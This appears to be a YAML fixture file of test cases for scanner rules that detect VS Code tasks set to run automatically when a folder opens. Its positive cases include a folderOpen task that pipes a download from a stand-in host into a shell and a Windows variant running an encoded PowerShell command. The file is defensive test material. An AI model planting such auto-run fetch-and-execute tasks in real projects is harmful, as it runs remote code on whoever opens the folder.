RC-AUTO-020:
  positive:
    - name: folderOpen task in JSONC with comments and trailing commas
      files:
        .vscode/tasks.json: |
          // Tasks for this workspace
          {
            "version": "2.0.0",
            "tasks": [
              {
                "label": "build",
                "type": "shell",
                "command": "echo build",
              },
              {
                "label": "init",
                "type": "shell",
                "command": "echo init",
                /* starts on open */
                "runOptions": { "runOn": "folderOpen" },
              },
            ],
          }
      expect: [{path: .vscode/tasks.json, line: 15}]
    - name: folderOpen task in a subfolder workspace
      files:
        tools/.vscode/tasks.json: '{"tasks": [{"label": "x", "runOptions": {"runOn": "folderOpen"}}]}'
      expect: [{path: tools/.vscode/tasks.json, line: 1}]
  negative:
    - name: task runs only on demand
      files:
        .vscode/tasks.json: |
          {"version": "2.0.0", "tasks": [{"label": "build", "command": "echo build", "runOptions": {"runOn": "default"}}]}
    - name: runOn folderOpen in a file VS Code does not read as tasks
      files:
        docs/tasks.json: '{"tasks": [{"runOptions": {"runOn": "folderOpen"}}]}'
    - name: folderOpen only mentioned in a label
      files:
        .vscode/tasks.json: '{"tasks": [{"label": "folderOpen", "command": "echo hi"}]}'

RC-AUTO-021:
  positive:
    - name: folderOpen task pipes a download into a shell
      files:
        .vscode/tasks.json: |
          {
            "version": "2.0.0",
            "tasks": [
              {
                "label": "init",
                "type": "shell",
                "command": "curl -s https://example.invalid/i.sh | sh",
                "runOptions": {"runOn": "folderOpen"}
              }
            ]
          }
      expect: [{path: .vscode/tasks.json, line: 7}]
    - name: Windows variant of the task runs an encoded command
      files:
        .vscode/tasks.json: |
          {
            "tasks": [{
              "label": "init",
              "command": "echo",
              "windows": {"command": "powershell -enc ZQBjAGgAbwAgAGgAaQAgAHQAaABlAHIAZQAgAGYAcgBpAGUAbgBkAA=="},
              "runOptions": {"runOn": "folderOpen"}
            }]
          }
      expect: [{path: .vscode/tasks.json, line: 5}]
  negative:
    - name: folderOpen task starts a local watcher
      files:
        .vscode/tasks.json: '{"tasks": [{"label": "watch", "command": "npm run watch", "runOptions": {"runOn": "folderOpen"}}]}'
    - name: download task that does not start on folder open
      files:
        .vscode/tasks.json: '{"tasks": [{"label": "fetch", "command": "curl -s https://example.invalid/x | sh"}]}'

